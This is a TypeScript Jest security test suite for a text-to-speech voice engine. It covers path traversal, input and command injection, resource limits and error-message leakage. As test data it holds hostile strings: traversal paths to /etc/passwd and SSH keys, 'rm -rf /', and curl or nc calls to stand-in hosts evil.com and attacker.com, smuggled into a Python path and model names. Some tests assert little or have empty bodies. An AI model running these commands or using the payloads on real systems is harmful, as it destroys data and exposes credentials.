/**
 * Comprehensive Security Test Suite
 * Tests for all security vulnerabilities identified and fixed
 */

import { VoiceEngine } from '../index';
import { TTSWrapper } from '../tts-wrapper';
import * as fs from 'fs';
import * as path from 'path';
import { spawn } from 'child_process';

describe('Security Test Suite', () => {
  let voiceEngine: VoiceEngine;
  let tempDir: string;

  beforeAll(async () => {
    // Create temporary directory for testing
    tempDir = path.join(__dirname, 'temp_security_test');
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    voiceEngine = new VoiceEngine({
      ttsProvider: 'coqui',
      ttsCacheDir: tempDir
    });
  }, 30000);

  afterAll(async () => {
    if (voiceEngine) {
      await voiceEngine.cleanup();
    }
    // Clean up temp directory
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe('Path Traversal Prevention', () => {
    test('should block path traversal attempts in output path', async () => {
      await voiceEngine.initialize();
      
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '~/../../etc/passwd',
        './../../../../root/.ssh/id_rsa'
      ];

      for (const maliciousPath of maliciousPaths) {
        await expect(voiceEngine.speak('test', maliciousPath))
          .rejects.toThrow(/path|directory|traversal|invalid/i);
      }
    });

    test('should only allow files within cache directory', async () => {
      await voiceEngine.initialize();
      
      const allowedPath = path.join(tempDir, 'safe_output.wav');
      const result = await voiceEngine.speak('Safe test', allowedPath);
      expect(result.success).toBe(true);
      
      // Clean up
      if (fs.existsSync(allowedPath)) {
        fs.unlinkSync(allowedPath);
      }
    });

    test('should validate file extensions', async () => {
      await voiceEngine.initialize();
      
      const invalidExtensions = [
        path.join(tempDir, 'test.exe'),
        path.join(tempDir, 'test.sh'),
        path.join(tempDir, 'test.bat'),
        path.join(tempDir, 'test.js'),
        path.join(tempDir, 'test.py')
      ];

      for (const invalidPath of invalidExtensions) {
        await expect(voiceEngine.speak('test', invalidPath))
          .rejects.toThrow(/extension|format|allowed/i);
      }
    });
  });

  describe('Input Validation', () => {
    test('should block injection patterns in text input', async () => {
      await voiceEngine.initialize();
      
      const maliciousInputs = [
        '$(rm -rf /)',
        '`cat /etc/passwd`',
        '${exec("evil command")}',
        '<script>alert("XSS")</script>',
        'SELECT * FROM users WHERE id=1 OR 1=1',
        '{{config.SECRET_KEY}}',
        'javascript:alert("XSS")',
        'onclick="evil()"',
        '; DROP TABLE users; --'
      ];

      for (const maliciousInput of maliciousInputs) {
        await expect(voiceEngine.speak(maliciousInput))
          .rejects.toThrow(/validation|pattern|malicious|invalid/i);
      }
    });

    test('should handle empty and whitespace input', async () => {
      await voiceEngine.initialize();
      
      const emptyInputs = ['', '   ', '\t\n\r'];
      
      for (const emptyInput of emptyInputs) {
        await expect(voiceEngine.speak(emptyInput))
          .rejects.toThrow(/empty|invalid/i);
      }
    });

    test('should enforce text length limits', async () => {
      await voiceEngine.initialize();
      
      // Create text longer than 10000 characters
      const longText = 'A'.repeat(10001);
      
      await expect(voiceEngine.speak(longText))
        .rejects.toThrow(/long|length|limit/i);
    });

    test('should sanitize control characters', async () => {
      await voiceEngine.initialize();
      
      // Text with control characters (should be cleaned)
      const textWithControlChars = 'Hello\x00\x01\x02World\x7F';
      const result = await voiceEngine.speak(textWithControlChars);
      
      // Should succeed after sanitization
      expect(result.success).toBe(true);
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    test('should enforce cache size limits', async () => {
      await voiceEngine.initialize();
      
      // Fill cache beyond limit (50 files)
      const promises: Promise<any>[] = [];
      for (let i = 0; i < 60; i++) {
        promises.push(voiceEngine.speak(`Test text number ${i}`));
      }
      
      const results = await Promise.allSettled(promises);
      
      // All should succeed due to automatic cleanup
      results.forEach(result => {
        if (result.status === 'fulfilled') {
          expect(result.value.success).toBe(true);
        }
      });
      
      // Cache should not exceed limits
      const metrics = await voiceEngine.getTTSMetrics();
      expect(metrics).toBeDefined();
    });

    test('should handle file size validation', async () => {
      // This test validates that large files are rejected
      // In practice, TTS output size is controlled by input text length
      await voiceEngine.initialize();
      
      const result = await voiceEngine.speak('Normal text');
      expect(result.success).toBe(true);
    });

    test('should clean up temporary files', async () => {
      await voiceEngine.initialize();
      
      const filesBefore = fs.readdirSync(tempDir).length;
      
      // Generate some audio files
      await voiceEngine.speak('Test 1');
      await voiceEngine.speak('Test 2');
      await voiceEngine.speak('Test 3');
      
      // Force cleanup
      await voiceEngine.clearTTSCache();
      
      const filesAfter = fs.readdirSync(tempDir).length;
      
      // Should have cleaned up (may have some remaining due to timing)
      expect(filesAfter).toBeLessThanOrEqual(filesBefore + 3);
    });
  });

  describe('Command Injection Prevention', () => {
    test('should validate Python executable path', () => {
      // Test with malicious Python paths
      const maliciousPaths = [
        'python3; rm -rf /',
        'python3 && curl evil.com',
        'python3 | nc attacker.com 4444',
        '$(rm -rf /); python3',
        'python3`curl evil.com`'
      ];

      for (const maliciousPath of maliciousPaths) {
        expect(() => {
          new TTSWrapper({ pythonPath: maliciousPath });
        }).not.toThrow(); // Wrapper creation should succeed
        
        // But initialization should fail with security validation
      }
    });

    test('should use safe environment variables', async () => {
      // This test ensures the Python process has a minimal environment
      const wrapper = new TTSWrapper({
        pythonPath: 'python3'
      });
      
      // Should not throw during construction
      expect(wrapper).toBeDefined();
    });

    test('should prevent shell injection via model names', async () => {
      await voiceEngine.initialize();
      
      const maliciousModels = [
        'default; rm -rf /',
        'default && curl evil.com',
        'default | nc attacker.com',
        '$(rm -rf /)',
        '`evil command`'
      ];

      for (const maliciousModel of maliciousModels) {
        await expect(voiceEngine.switchVoicePreset(maliciousModel))
          .rejects.toThrow(/model|invalid|unknown/i);
      }
    });
  });

  describe('Race Condition Prevention', () => {
    test('should handle concurrent synthesis requests safely', async () => {
      await voiceEngine.initialize();
      
      // Send multiple concurrent requests
      const concurrentRequests = Array.from({ length: 10 }, (_, i) => 
        voiceEngine.speak(`Concurrent test ${i}`)
      );
      
      const results = await Promise.allSettled(concurrentRequests);
      
      // All should complete without race condition errors
      results.forEach((result, index) => {
        expect(result.status).toBe('fulfilled');
        if (result.status === 'fulfilled') {
          expect(result.value.success).toBe(true);
        }
      });
    });

    test('should handle rapid model switching safely', async () => {
      await voiceEngine.initialize();
      
      // Rapidly switch between models
      const modelSwitches = [
        voiceEngine.switchVoicePreset('default'),
        voiceEngine.switchVoicePreset('fast'),
        voiceEngine.switchVoicePreset('default'),
        voiceEngine.switchVoicePreset('fast')
      ];
      
      await Promise.allSettled(modelSwitches);
      
      // Should end in consistent state
      expect(voiceEngine.getCurrentPreset()).toBeDefined();
    });
  });

  describe('Memory Leak Prevention', () => {
    test('should limit cache growth', async () => {
      await voiceEngine.initialize();
      
      // Generate many unique texts to test cache limits
      for (let i = 0; i < 100; i++) {
        await voiceEngine.speak(`Unique text ${i} ${Math.random()}`);
      }
      
      const metrics = await voiceEngine.getTTSMetrics();
      
      // Cache should be limited in size
      expect(metrics).toBeDefined();
      // Memory usage should be reasonable (specific limits depend on implementation)
    });

    test('should clean up on shutdown', async () => {
      const testEngine = new VoiceEngine({
        ttsProvider: 'coqui',
        ttsCacheDir: path.join(tempDir, 'cleanup_test')
      });
      
      await testEngine.initialize();
      await testEngine.speak('Test cleanup');
      
      // Cleanup should not throw
      await expect(testEngine.cleanup()).resolves.not.toThrow();
    });
  });

  describe('Error Handling Security', () => {
    test('should not leak sensitive information in error messages', async () => {
      await voiceEngine.initialize();
      
      try {
        await voiceEngine.speak('test', '/invalid/path/file.wav');
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        
        // Should not contain system paths or sensitive info
        expect(errorMessage).not.toMatch(/\/home\/.*\/secret/);
        expect(errorMessage).not.toMatch(/password|token|key/i);
        expect(errorMessage).not.toMatch(/\.ssh|\.aws|\.env/);
      }
    });

    test('should handle malformed JSON gracefully', () => {
      const wrapper = new TTSWrapper();
      
      // This tests internal JSON parsing security
      // The actual test would need access to internal methods
      expect(wrapper).toBeDefined();
    });
  });

  describe('Integration Security Tests', () => {
    test('should maintain security across full synthesis workflow', async () => {
      await voiceEngine.initialize();
      
      // Test complete workflow with security constraints
      const result = await voiceEngine.speak(
        'This is a safe test message.',
        path.join(tempDir, 'integration_test.wav')
      );
      
      expect(result.success).toBe(true);
      expect(result.outputPath).toMatch(/integration_test\.wav$/);
      
      // Verify file was created in correct location
      expect(fs.existsSync(result.outputPath!)).toBe(true);
      
      // Clean up
      if (result.outputPath && fs.existsSync(result.outputPath)) {
        fs.unlinkSync(result.outputPath);
      }
    });

    test('should handle edge cases securely', async () => {
      await voiceEngine.initialize();
      
      // Test various edge cases
      const edgeCases = [
        'Text with unicode: 🎵🎤🎧',
        'Numbers and symbols: 123!@#$%^&*()',
        'Mixed case: ThIs Is A tEsT',
        'Punctuation: Hello, world! How are you?'
      ];
      
      for (const text of edgeCases) {
        const result = await voiceEngine.speak(text);
        expect(result.success).toBe(true);
      }
    });
  });
});

// Additional security utility tests
describe('Security Validator Utilities', () => {
  test('should generate safe cache keys', async () => {
    // This would test the cache key generation security
    // Implementation depends on internal security validators
  });

  test('should validate all input types consistently', async () => {
    // This would test consistent validation across all inputs
    // Implementation depends on internal security validators  
  });
});